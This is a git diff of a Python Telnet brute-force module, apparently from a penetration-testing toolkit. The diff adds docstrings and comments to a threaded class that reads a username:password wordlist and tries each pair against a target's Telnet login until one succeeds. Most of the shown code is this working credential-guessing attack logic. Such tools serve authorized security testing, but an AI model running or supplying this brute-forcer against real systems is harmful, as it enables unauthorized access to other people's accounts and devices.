@@ -7,13 +7,27 @@ from .misc import *
 
 class TelnetBrute(threading.Thread):
     def __init__(self, target):
+        """"
+        Default constrictor.
+        :param target:
+        :return:
+        """
         threading.Thread.__init__(self)
         self.target = target
 
     def telnet_brute(self, hostname, username, password):
+        """"
+        Runs the brute force function on the Telnet service.
+        :param hostname:
+        :param username:
+        :param password:
+        :return True:
+        :return False:
+        """
         # Initializing Telnet Client
         client = telnetlib.Telnet(hostname)
 
+        # If unexpected errors were faced with the Telnet service.
         try:
             client.read_until(b"login: ")
         except EOFError:
@@ -24,6 +38,7 @@ class TelnetBrute(threading.Thread):
         except socket.error:
             print(print_red("[!] Error: Write(username) failed"))
 
+        # Brute force the telnet service.
         if password:
             try:
                 client.read_until(b"Password: ")
@@ -44,13 +59,17 @@ class TelnetBrute(threading.Thread):
                 print(print_green(f"\n[TELNET] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}"))
                 return True
             else:
-                # print(f"\n[TELNET] Invalid credentials for {username}:{password}")
                 pass
 
             client.close()
             return False
 
     def run(self):
+        """"
+        Reads the wordlist and runs the brute force function on the Telnet service.
+        :param:
+        :return:
+        """
         # Read the file
         parent_dir = os.getcwd()
         wordlist_path = os.path.join(parent_dir, "data", "wordlists", "telnet_wordlist.txt")
@@ -60,6 +79,5 @@ class TelnetBrute(threading.Thread):
         for cred in cred_list:
             username = cred.split(':')[0]
             password = cred.split(':')[1]
-
             if self.telnet_brute(self.target, username, password):
                 break
